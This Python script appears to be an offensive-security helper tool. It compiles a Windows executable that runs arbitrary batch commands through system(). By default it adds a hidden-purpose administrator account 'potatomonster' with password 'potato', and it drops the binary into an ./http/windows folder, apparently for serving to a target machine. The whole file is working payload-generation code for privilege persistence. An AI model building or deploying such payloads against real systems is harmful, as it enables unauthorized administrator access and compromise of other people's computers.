#!/usr/bin/python3
from typing import List
DEFAULT_COMMAND = "net user potatomonster potato /add; net localgroup administrators potatomonster /add"
DEFAULT_OUTFILE = "out.exe"

def get_commands(full_cmd: str) -> List[str]:
    commands = []
    for cmd in [cmd.strip() for cmd in full_cmd.split(";")]:
        # Escape all backslashes
        if '\\' in cmd:
            cur_idx = 0
            cur_len = len(cmd)
            while cur_idx < cur_len:
                if cmd[cur_idx] == '\\':
                    cmd = cmd[:cur_idx] + '\\' + cmd[cur_idx:]
                    cur_idx += 1
                    cur_len += 1
                cur_idx += 1
        # Escape all double quotes
        if '"' in cmd:
            cur_idx = 0
            cur_len = len(cmd)
            while cur_idx < cur_len:
                if cmd[cur_idx] == '"':
                    cmd = cmd[:cur_idx] + '\\' + cmd[cur_idx:]
                    cur_idx += 1
                    cur_len += 1
                cur_idx += 1
        commands.append(cmd)
    return commands

if __name__ == "__main__":
    import subprocess
    from pathlib import Path
    from lib.prog import *
    prog = Prog(
        "gen_win_exe_cmd",
        "Generates a Windows executable that runs shell commands. Default is to create a 32-bit executable to add a new administrator \"potatomonster\" with password \"potato\"", [
            Arg(ArgType.OPTIONAL_VAL, "arch", "a", arg_val_type=str, arg_help="Architecture. x32 for 32-bit, x64 for 64-bit."),
            Arg(ArgType.OPTIONAL_VAL, "commands", "c", arg_val_type=str, arg_help="Batch commands, separated by semicolons."),
            Arg(ArgType.OPTIONAL_VAL, "outfile", "o", arg_val_type=str, arg_help="Name of executable.")
        ]
    )
    arch = prog.args["arch"]
    if arch is None or len(arch) == 0:
        arch = "x32"
    if arch not in ["x32", "x64"]:
        print("[!] Invalid architecture -- expected \"x32\" or \"x64\".")
        exit(1)
    full_cmd = prog.args["commands"]
    if full_cmd is None or len(full_cmd) == 0:
        full_cmd = DEFAULT_COMMAND
    outfile = prog.args["outfile"]
    if outfile is None or len(outfile) == 0:
        outfile = DEFAULT_OUTFILE
        
    commands = get_commands(full_cmd)
    compiler = ""
    if arch == "x32":
        compiler = "i686-w64-mingw32-gcc"
    else:
        compiler = "x86_64-w64-mingw32-gcc-win32"

    # Generate source
    source_p = Path("/tmp/gen_win_malware_cmd.c")
    source_p.touch()
    print(f"[i] Generating source file in {str(source_p)}:\n-----")

    c_src = "#include <stdlib.h>\nint main()\n{\n"
    for command in commands:
        c_src += f"\tsystem(\"{command}\");\n"
    c_src += "\treturn 0;\n}"
    print(c_src)
    print("-----")

    source_p.write_text(c_src)

    # Generate executable
    out_dir = Path(f"./http/windows")
    out_dir.mkdir(parents=True, exist_ok=True)
    exe_p = out_dir.joinpath(outfile)
    exe_p.touch()

    result = subprocess.run(
        [compiler, str(source_p), "-o", str(exe_p.resolve())],
        stdin=None,
        stdout=None,
        stderr=subprocess.STDOUT
    )
    
    if result.returncode != 0:
        print(f"[!] Error generating {arch} executable.")
    else:
        print(f"[i] {arch} Executable generated: {str(exe_p)}.")
